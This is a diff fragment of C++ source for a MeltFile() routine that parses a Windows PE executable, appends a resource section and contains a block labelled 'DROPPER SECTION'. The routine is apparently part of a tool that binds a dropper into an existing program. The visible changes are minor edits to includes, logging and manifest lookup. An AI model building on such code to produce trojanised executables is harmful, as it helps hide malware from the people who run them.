@@ -19,6 +19,8 @@ namespace bf = boost::filesystem;
 #include "ResourceSection.h"
 #include "retcodes.h"
 
+#include "PEParser.h"
+
 #include "MeltFile.h"
 
 #include "../mxml/mxml.h"
@@ -60,16 +62,19 @@ int MeltFile( char const * const input_path, char const * const output_path, Mel
 	delete buffer;
 	
 	PEObject* object = new PEObject(data, size);
+	// object->feed(data, size);
 	if (object->parse() == false) {
 		delete [] data;
 		return RETCODE_FAIL_INVALID;
 	}
 	//object->saveOEP();
 	
+#if 0
 	if (object->isAuthenticodeSigned()) 
 	{
 		cout << "File is AUTHENTICODE SIGNED." << endl;
 	}
+#endif
 	
 	//
 	// DROPPER SECTION
@@ -122,7 +127,7 @@ int MeltFile( char const * const input_path, char const * const output_path, Mel
 			ResourceSection* resourceSection = new ResourceSection(*resSection); 
 			object->appendSection(resourceSection->GetBase());
 			object->setSection(IMAGE_DIRECTORY_ENTRY_RESOURCE, resourceSection->GetBase());
-			cout << "New resource section size: " << dec << ((GenericSection*)resourceSection)->size() << endl;
+			// cout << "New resource section size: " << dec << ((GenericSection*)resourceSection)->size() << endl;
 			ResourceDirectory* rdDir = NULL;
 			try {
 				rdDir = resourceSection->ScanDirectory();
@@ -137,7 +142,7 @@ int MeltFile( char const * const input_path, char const * const output_path, Mel
 			if (rdDir)
 			{
 				// *** Get MANIFEST
-				WCHAR* resType = RT_MANIFEST;
+				WCHAR* resType = MAKEINTRESOURCEW(24);
 				int typeIdx = rdDir->Find(resType);
 				if (typeIdx == -1) {
 
